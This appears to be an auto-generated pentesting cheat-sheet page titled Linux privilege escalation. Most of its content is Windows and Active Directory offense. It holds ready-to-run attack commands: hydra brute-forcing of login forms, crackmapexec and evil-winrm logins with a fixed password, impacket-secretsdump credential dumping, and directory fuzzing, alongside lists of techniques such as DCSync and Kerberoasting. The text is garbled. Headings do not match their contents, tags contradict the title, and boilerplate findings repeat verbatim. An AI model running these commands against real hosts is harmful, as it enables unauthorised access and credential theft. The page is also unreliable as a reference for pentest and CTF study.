---
TitleSEO: "Linux Privilege Escalation Techniques | ZureFX"
TitlePost: "Linux Privilege Escalation Techniques"
Author: "ZureFX"
Description: "Personal notes on Linux Privilege Escalation Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, networking, windows, privilege escalation"
URL: "https://zurefx.github.io/notes/note-linux-privilege-escalation-techniques-791.html"
URL_IMAGES: ""
Date: "2025-08-18"
Tags: "DFIR, Networking, Windows, Privilege Escalation"
Section: "notes"
Lang: "en"
main_img: "note-linux-privilege-escalation-techniques-791"
Permalink: "/notes/note-linux-privilege-escalation-techniques-791.html"
BtnLabel: "Read Notes"
Pick: 0
---
## HTTPS

### hashcat

```bash
evil-winrm -i 10.125.236.224 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.28.40.46 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.104.139.13/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

- `Silver Ticket`
- `psexec`
- `crackmapexec`

The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible. Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
crackmapexec smb 10.38.199.192 -u administrator -p 'P@ssw0rd!' --shares
```

## mimikatz

### SSH

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.47.51.205 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

- `IDOR`
- `gobuster`
- `ACL Abuse`
- `hydra`
- `dcomexec`

- `secretsdump`
- `SQL Injection`
- `Command Injection`
- `GetUserSPNs`
- `wpscan`

## AS-REP Roasting

### secretsdump

- `DCSync`
- `smbexec`
- `AS-REP Roasting`
- `Kerberoasting`
- `socat`

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.97.172.60/FUZZ
crackmapexec smb 10.98.167.104 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.16.29.246
```

- `NFS No Root Squash`
- `XXE`
- `SUID Binary`
- `sqlmap`
- `metasploit`
- `crackmapexec`
